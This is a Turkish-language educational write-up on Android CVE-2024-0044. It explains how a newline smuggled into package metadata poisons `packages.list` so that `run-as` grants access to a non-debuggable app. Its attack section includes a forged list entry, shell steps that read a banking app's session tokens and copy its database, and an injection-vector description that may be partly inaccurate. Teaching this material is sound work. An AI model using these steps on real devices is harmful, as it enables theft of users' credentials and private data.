# CVE-2024-0044 — Teknik Mekanizma

> **Konu:** `run-as` aracının çalışma mantığı ve zafiyetin tetiklenme noktası  
> **Hedef Kitle:** Temel Linux/Android bilgisine sahip öğrenciler  
> **Bağımlılık:** `01_zafiyet_analizi.md` dosyasının okunmuş olması önerilir

---

## 1. UID ve Sandbox Nedir?

Android, her uygulamaya kurulum sırasında benzersiz bir **UID** (User ID) atar. Bu numara Linux çekirdeği düzeyinde uygulamanın kimliğini belirler. Örneğin bir mesajlaşma uygulaması `u0_a150` (UID 10150) alırken, bir bankacılık uygulaması `u0_a203` (UID 10203) alabilir.

**Sandbox** (kum havuzu), bu UID sayesinde işler: her uygulama yalnızca kendi UID'siyle etiketlenmiş dosya ve süreçlere erişebilir. Uygulama A, uygulama B'nin `/data/data/` dizinine giremez çünkü dosya izinleri farklı UID'ye aittir. Bu mekanizma, uygulamaları birbirinden izole eden temel güvenlik katmanıdır.

Kısacası:
- **UID** → "Sen kimsin?" sorusunun cevabı
- **Sandbox** → "Nereye erişebilirsin?" sorusunun cevabı

> 💡 **Analoji:** UID'yi bir öğrenci numarası, sandbox'ı ise o öğrenciye ait kilitli dolap olarak düşünebilirsiniz. Her öğrenci yalnızca kendi dolabını açabilir; başkasının dolabına erişmesi fiziksel olarak engellenmiştir.

---

## 2. `run-as` Aracı Nasıl Çalışır?

`run-as`, Android'de yerleşik olarak bulunan bir komut satırı aracıdır. Geliştiricilerin ADB üzerinden kendi uygulamalarının özel verilerine erişmesini sağlar. Temel amacı, debuggable (hata ayıklanabilir) uygulamaların iç dizinlerini inceleyebilmektir.

### Normal Çalışma Adımları

1. **Paket adını alır:** Geliştirici `run-as com.ornek.uygulama` komutunu çalıştırır.
2. **`packages.list` dosyasını okur:** `/data/system/packages.list` dosyasından paketin kayıtlı olup olmadığını, UID'sini ve debuggable bayrağını kontrol eder.
3. **Yetki doğrulaması yapar:** Paket debuggable ise ve kayıt geçerliyse, `setuid()` sistem çağrısıyla o uygulamanın UID'sine geçiş yapar.
4. **Shell açar:** Artık geliştirici, uygulamanın sandbox'ı içinde komut çalıştırabilir.

### Somut Örnek: Geliştiricinin Normal Kullanımı

Diyelim ki bir geliştirici `com.ornek.notlar` adlı bir not uygulaması geliştiriyor ve uygulamanın SQLite veritabanını kontrol etmek istiyor:

```bash
# 1. ADB üzerinden cihaza bağlan
$ adb shell

# 2. run-as ile uygulamanın sandbox'ına gir
shell@device:/ $ run-as com.ornek.notlar

# 3. Artık uygulamanın özel dizinindesiniz
u0_a150@device:/data/data/com.ornek.notlar $ ls
cache/  databases/  shared_prefs/

# 4. Veritabanını inceleyin
u0_a150@device:/data/data/com.ornek.notlar $ sqlite3 databases/notlar.db
sqlite> SELECT * FROM notes LIMIT 3;
1|Alışveriş listesi|2026-05-30
2|Proje notları|2026-05-31
3|Toplantı ajandası|2026-06-01
```

Dikkat edin: shell prompt'u `shell@` yerine `u0_a150@` olarak değişti. Bu, `run-as`'ın `setuid()` çağrısıyla geçerli kullanıcıyı uygulamanın UID'sine geçirdiğinin kanıtıdır. Geliştirici artık uygulamanın gözüyle sisteme bakıyor.

> ⚠️ **Kritik nokta:** `run-as` yalnızca debuggable bayrağı `1` olan uygulamalarda çalışır. Üretim (production) uygulamalarında bu bayrak `0` olarak ayarlıdır, dolayısıyla `run-as` erişimi reddeder.

---

## 3. `packages.list` Dosya Formatı

`run-as`'ın kararlarını verdiği kaynak, `/data/system/packages.list` düz metin dosyasıdır. Her satırda bir paket bilgisi bulunur:

```
com.ornek.notlar 10150 1 /data/data/com.ornek.notlar default:targetSdkVersion=33 none 0 1
com.banka.app 10203 0 /data/data/com.banka.app default:targetSdkVersion=34 none 0 1
com.sosyal.medya 10178 0 /data/data/com.sosyal.medya default:targetSdkVersion=33 none 0 1
```

Alanlar sırasıyla:

| Sıra | Alan | Açıklama | Örnek |
|:----:|------|----------|-------|
| 1 | Paket adı | Uygulamanın benzersiz kimliği | `com.ornek.notlar` |
| 2 | UID | Linux kullanıcı numarası | `10150` |
| 3 | Debuggable | Hata ayıklama bayrağı (1=açık, 0=kapalı) | `1` |
| 4 | Veri dizini | Uygulamanın özel klasörü | `/data/data/com.ornek.notlar` |
| 5 | SELinux etiketi | Güvenlik bağlamı | `default:targetSdkVersion=33` |

`run-as`, bu dosyayı **yukarıdan aşağıya** satır satır okur ve istenen paket adıyla eşleşen **ilk satırı** kullanır. İşte tam olarak bu davranış, zafiyetin temelini oluşturur.

---

## 4. Zafiyet Adım Adım Nasıl İşliyor?

### Adım 1: Zararlı Paket Adının Hazırlanması

Saldırgan, normal bir APK dosyası hazırlar ancak paket adını manipüle eder. Paket adının içine satır sonu karakterleri (`\n`) ve sahte bir `packages.list` satırı enjekte eder:

```
zararlı-paket\n
com.banka.app 10203 1 /data/data/com.banka.app default:targetSdkVersion=34
```

Burada kritik değişiklik: hedef uygulamanın (`com.banka.app`) debuggable bayrağının `0` yerine `1` yapılmasıdır.

### Adım 2: Zararlı APK'nın Yüklenmesi

Saldırgan bu APK'yı ADB üzerinden cihaza yükler:

```bash
$ adb install zararlı.apk
Success
```

Android'in paket yükleyicisi (`installd`), paket adını doğrulamadan `packages.list` dosyasına yazar. Satır sonu karakterleri filtrelenmediği için dosyanın yapısı bozulur.

### Adım 3: `packages.list` Dosyasının Zehirlenmesi

Yüklemeden sonra `packages.list` dosyası şöyle görünür:

```
...
zararlı-paket                                          ← saldırganın gerçek paketi (kırık satır)
com.banka.app 10203 1 /data/data/com.banka.app ...     ← SAHTE: enjekte edilmiş satır (debuggable=1)
...
com.banka.app 10203 0 /data/data/com.banka.app ...     ← GERÇEK: orijinal kayıt (debuggable=0)
...
```

Dosyada artık `com.banka.app` için **iki satır** vardır: biri sahte (debuggable=1), biri gerçek (debuggable=0). Sahte satır, dosyada gerçek satırın **üstünde** yer alır.

### Adım 4: `run-as` Komutunun Kandırılması

Saldırgan şimdi hedef uygulamanın sandbox'ına girmeyi dener:

```bash
$ adb shell run-as com.banka.app
```

`run-as`, `packages.list` dosyasını yukarıdan aşağıya okur. `com.banka.app` ile eşleşen **ilk satır** sahte satırdır ve debuggable bayrağı `1`'dir. Bu yüzden `run-as`, erişimi onaylar ve `setuid(10203)` çağrısıyla saldırganı bankacılık uygulamasının UID'sine geçirir.

### Adım 5: Sandbox Atlanır, Veriler Ele Geçirilir

Saldırgan artık hedef uygulamanın özel dizinindedir:

```bash
u0_a203@device:/data/data/com.banka.app $ ls
cache/  databases/  shared_prefs/  files/

# Oturum tokenlerini çal
u0_a203@device:/data/data/com.banka.app $ cat shared_prefs/auth_prefs.xml
<?xml version='1.0' encoding='utf-8'?>
<map>
    <string name="session_token">eyJhbGciOiJIUzI1NiIs...</string>
    <string name="refresh_token">dGhpcyBpcyBhIHRlc3Q...</string>
</map>

# Veritabanını kopyala
u0_a203@device:/data/data/com.banka.app $ cp databases/accounts.db /sdcard/
```

Saldırgan, bankacılık uygulamasının oturum tokenlerini, hesap bilgilerini ve diğer hassas verilerini okuyabilir veya dışarı kopyalayabilir.

---

## 5. Saldırı Özeti (Akış)

```
[1] Zararlı APK hazırlanır (paket adında \n + sahte packages.list satırı)
              ↓
[2] APK cihaza yüklenir → installd sanitizasyon yapmaz
              ↓
[3] packages.list zehirlenir → sahte satır gerçek kaydın üstüne eklenir
              ↓
[4] run-as com.banka.app → sahte kaydı okur (debuggable=1)
              ↓
[5] setuid(10203) → saldırgan bankacılık uygulamasının sandbox'ında
              ↓
[6] Özel veriler (tokenler, veritabanları, dosyalar) ele geçirilir
```

---

## 6. Neden Bu Kadar Tehlikeli?

| Faktör | Açıklama |
|--------|----------|
| **Düşük karmaşıklık** | Saldırı için özel bir exploit veya root erişimi gerekmiyor; sadece ADB ve manipüle edilmiş bir APK yeterli. |
| **Geniş etki alanı** | Android 12, 12L, 13 ve 14 sürümleri etkileniyor — milyarlarca cihaz potansiyel hedef. |
| **Sessiz çalışma** | Saldırı sırasında kullanıcıya herhangi bir uyarı gösterilmiyor; uygulama normal çalışmaya devam ediyor. |
| **Zincirleme potansiyel** | Ele geçirilen tokenlar ve veriler, daha büyük saldırı zincirlerinin (hesap ele geçirme, finansal dolandırıcılık) ilk adımı olabilir. |

> ⚠️ **Temel sorun:** `run-as`, `packages.list` dosyasındaki verilere koşulsuz güvenir ve girdi doğrulaması yapmaz. `installd` ise paket adlarını yazarken sanitizasyon uygulamaz. İki bileşendeki güven varsayımının birleşimi, zafiyeti mümkün kılmaktadır.

---

> 📝 *Bu döküman akademik amaçlıdır. Tüm testler kontrollü laboratuvar ortamında gerçekleştirilecektir.*
